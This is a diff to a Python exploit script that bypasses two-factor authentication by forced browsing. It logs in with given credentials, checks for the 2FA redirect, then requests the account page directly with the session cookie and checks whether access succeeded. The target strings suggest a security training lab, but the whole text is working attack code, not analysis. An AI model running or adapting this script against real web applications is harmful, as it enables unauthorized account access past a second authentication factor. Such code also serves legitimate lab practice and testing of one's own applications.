@@ -178,36 +178,37 @@ import sys
 def exploit_2fa_bypass(url, username, password):
     login_url = f"{url.rstrip('/')}/login"
     target_url = f"{url.rstrip('/')}/my-account"
-
-    # Session to hold cookies
+    
     s = requests.Session()
-
-    print(f"Attempting login with {username}:{password}")
-
-    # 1. Send Credentials (Step 1)
-    # This request should technically trigger the 2FA redirect, 
-    # but crucially, it sets the SESSION COOKIE.
+    
+    print(f"[*] Attempting login with {username}:{password}")
+    
+    # 1. Send Credentials
     data = {'username': username, 'password': password}
     resp = s.post(login_url, data=data)
-
-    print(f"[*] Login Status: {resp.status_code}")
     
-    # Check if we have cookies
-    if not s.cookies:
-        print("[-] No session cookies received. Exploit might fail.")
+    # IMPROVED CHECK:
+    # If we are still on '/login', the password was wrong.
+    # If we are on '/login2', the password was accepted.
+    if "/login2" in resp.url:
+        print("[+] Step 1 Successful: Redirected to 2FA page.")
+    elif "/login" in resp.url:
+        print("[-] Login Failed: Invalid credentials.")
+        # We stop here because there is no point forcing the browse if we aren't logged in
+        return
     else:
-        print("[+] Session cookie captured!")
+        print(f"[?] Unexpected URL: {resp.url}")
 
-    # 2. Force Browse to Target (Step 2)
-    # We ignore the 2FA page and go straight to the account page.
-    print(f"[*] Bypassing 2FA -> Accessing {target_url}")
+    # 2. Force Browse to Target (The Vulnerability)
+    # We ignore the 2FA input field and request the account page directly.
+    print(f"[*] Attempting 2FA Bypass -> GET {target_url}")
     resp = s.get(target_url)
     
     # 3. Verification
     if "Your username is" in resp.text or "Log out" in resp.text:
         print("[!!!] SUCCESS: Accessed account page without 2FA!")
     else:
-        print("[-] Failed to bypass. You might be stuck on the 2FA page.")
+        print("[-] Failed to bypass. You are likely still stuck on the login or 2FA page.")
 
 def main():
     ap = argparse.ArgumentParser()
